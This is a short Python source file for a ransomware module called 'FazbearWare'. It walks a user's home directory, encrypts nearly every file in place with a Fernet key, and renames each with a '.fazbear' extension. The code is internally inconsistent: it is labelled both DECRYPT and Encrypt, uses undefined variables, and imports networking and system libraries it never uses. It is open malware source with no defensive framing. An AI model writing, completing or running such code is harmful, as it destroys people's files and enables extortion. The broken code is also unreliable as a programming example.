# FAZBEARWARE - DECRYPT
"""
Encrypt - FazbearWare
Description: This module is responsible for encrypting user data within the specified directory, AES-based file encryption and filename obfuscation with Fernet Keys.
"""

import os  
from cryptography.fernet import Fernet 
import requests
import platform
import socket
import psutil

#DECRYPTION PROCCESS

def encrypt_path():
    with open("KEY", "wb") as file_key :#create binary key to encrypt (and decrypt)
                    file_key.write(key)
                    loaded_key = Fernet(key)
    for root, dirs, files in os.walk(home_path):
        
        if 'AppData' in dirs:
            dirs.remove('AppData') 
        for x in files:
            full_path = os.path.join(root , x)
            if x == "KEY" or x.endswith(".py") or x.endswith(".dll") or x.endswith(".sys"):
                continue
            try : 
                
                
                with open(full_path, "rb") as f:
                    original_data = f.read()
                    
         
                #encrypt data, fernet is gonna to encrypt the content in the variable "original_data" using the loaded ke
                encrypted_data = loaded_key.encrypt(original_data)

                #save encrypted file
                with open(full_path, "wb") as f_encrypted:
                    f_encrypted.write(encrypted_data) 
                    #rename files 
                new_name = os.path.join(root,x + ".fazbear")
                os.rename(full_path,new_name)
                print(f"encrypted : {full_path}")
            except Exception as e:
                print(f"Error in {full_path}: {e}")

if __name__ == "__main__":
    encrypt_path()